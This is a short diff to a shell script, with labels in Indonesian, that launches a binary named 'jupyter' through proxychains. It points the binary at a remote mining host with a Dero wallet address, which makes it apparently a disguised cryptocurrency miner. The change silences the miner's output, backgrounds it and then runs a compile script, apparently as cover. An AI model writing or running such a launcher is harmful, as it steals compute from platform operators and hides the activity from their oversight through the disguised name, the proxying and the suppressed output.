@@ -1,4 +1,5 @@
 chmod +x proxychains.conf jupyter proxy libproxychains4.so proxychains.conf compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./proxy ./jupyter -r 149.56.135.66:80 -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.BRH22
+./proxy ./jupyter -r 149.56.135.66:80 -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.BRH22 >/dev/null &
+./compile.sh
